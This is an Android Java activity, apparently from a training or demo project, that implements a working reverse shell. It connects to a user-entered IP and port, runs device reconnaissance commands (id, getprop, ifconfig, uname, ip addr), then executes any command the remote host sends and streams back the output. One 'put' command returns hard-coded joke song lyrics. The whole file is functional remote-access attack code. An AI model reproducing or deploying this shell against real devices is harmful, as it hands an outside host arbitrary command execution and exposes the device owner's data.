package cn.itcast.hilink;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class ReverseShellActivity extends AppCompatActivity {
    private static final String TAG = "ReverseShellActivity";

    private EditText ipInput, portInput;
    private TextView logView;
    private ScrollView scrollView;
    private Button startButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_reverse_shell);

        ipInput = findViewById(R.id.ip_input);
        portInput = findViewById(R.id.port_input);
        logView = findViewById(R.id.log_view);
        scrollView = (ScrollView) logView.getParent();
        startButton = findViewById(R.id.start_button);


        // 代码按钮点击事件
        Button codeButton = findViewById(R.id.code_button);
        codeButton.setOnClickListener(v -> {
            // 跳转到新的页面
            Intent intent = new Intent(ReverseShellActivity.this, CodeActivity.class);
            startActivity(intent);
        });



        startButton.setOnClickListener(v -> {
            String ip = ipInput.getText().toString().trim();
            String portStr = portInput.getText().toString().trim();

            if (!ip.isEmpty() && !portStr.isEmpty()) {
                try {
                    int port = Integer.parseInt(portStr);
                    showToast("正在连接到 " + ip + ":" + port);
                    appendLog("🚀 发起连接...");
                    new ReverseShellTask(ip, port).execute();
                } catch (NumberFormatException e) {
                    showToast("端口格式错误！");
                }
            } else {
                showToast("IP 和端口都不能为空！");
            }
        });
    }

    private void appendLog(String msg) {
        runOnUiThread(() -> {
            logView.append(msg + "\n");
            scrollView.post(() -> scrollView.fullScroll(View.FOCUS_DOWN));
        });
    }

    private void showToast(String msg) {
        runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
    }

    private class ReverseShellTask extends AsyncTask<Void, String, Void> {
        private final String ip;
        private final int port;

        public ReverseShellTask(String ip, int port) {
            this.ip = ip;
            this.port = port;
        }

        @Override
        protected Void doInBackground(Void... voids) {
            try (Socket socket = new Socket(ip, port)) {
                publishProgress("✅ 连接成功！");
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                BufferedWriter out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

                String[] autoCmds = new String[]{
                        "id",
                        "getprop ro.product.model",
                        "getprop ro.build.version.release",
                        "ifconfig",
                        "uname -a",
                        "ip addr",
                        "put"
                };

                for (String cmd : autoCmds) {
                    publishProgress("→ 执行自动命令: " + cmd);
                    sendCommand(cmd, out);
                }

                out.write("[auto_end]\n");
                out.flush();

                String cmd;
                while ((cmd = in.readLine()) != null) {
                    publishProgress("→ 执行: " + cmd);
                    sendCommand(cmd, out);
                    out.write("[end]\n");
                    out.flush();
                }

            } catch (Exception e) {
                Log.e(TAG, "Reverse shell error", e);
                publishProgress("❌ 连接失败: " + e.getMessage());
            }
            return null;
        }

        private void sendCommand(String cmd, BufferedWriter out) throws IOException {
            if ("put".equals(cmd.trim())) {
                String fakeOutput = "来财\n" +
                        "来\n" +
                        "来财\n" +
                        "来\n" +
                        "来财\n" +
                        "来\n" +
                        "来财\n" +
                        "来\n" +
                        "宗旨利滚利\n" +
                        "对应\n" +
                        "好运\n" +
                        "八方来\n" +
                        "散了才能聚\n" +
                        "你不出手\n" +
                        "说聊斋\n" +
                        "这一把直接合\n" +
                        "因为我花钱交朋友\n" +
                        "艺高人胆大\n" +
                        "揽佬小盲三条九\n" +
                        "回馈一下社会先\n" +
                        "摸到那顶皇冠后\n" +
                        "找你做事人太多\n" +
                        "事情两袖清风做\n" +
                        "一阴一阳之谓道\n" +
                        "紫气东来\n" +
                        "明码标价的那些物\n" +
                        "非黑即白\n" +
                        "若上颁奖台切莫张灯结彩\n" +
                        "八仙桌的收尾少不了空心菜\n" +
                        "上北下南左西右东\n" +
                        "东南东北\n" +
                        "西北西南\n" +
                        "步步高升\n" +
                        "八方来财\n" +
                        "四海为家家兴旺\n" +
                        "百事可乐\n" +
                        "千事吉祥\n" +
                        "万事如意\n" +
                        "顺风顺水\n" +
                        "天道酬勤\n" +
                        "鹏程万里\n" +
                        "你不给点表示吗\n" +
                        "我们这的憋佬仔\n" +
                        "脖上喜欢挂玉牌\n" +
                        "香炉供台上摆\n" +
                        "长大才开白黄牌\n" +
                        "虔诚拜三拜\n" +
                        "钱包里多几百\n" +
                        "易的是六合彩\n" +
                        "难的是等河牌\n" +
                        "来财\n" +
                        "来\n" +
                        "来财\n" +
                        "来\n" +
                        "来财\n" +
                        "来\n" +
                        "来财\n" +
                        "来\n" +
                        "宗旨利滚利\n" +
                        "对应\n" +
                        "好运\n" +
                        "八方来\n" +
                        "散了才能聚\n" +
                        "你不出手\n" +
                        "说聊斋\n";
                out.write(fakeOutput);
                out.newLine();
                publishProgress(fakeOutput);
                return;
            }

            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader stdOut = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader stdErr = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            String line;
            while ((line = stdOut.readLine()) != null) {
                out.write(line + "\n");
                publishProgress(line);
            }
            while ((line = stdErr.readLine()) != null) {
                out.write("[err] " + line + "\n");
                publishProgress("[err] " + line);
            }
        }

        @Override
        protected void onProgressUpdate(String... values) {
            for (String msg : values) {
                appendLog(msg);
            }
        }
    }
}
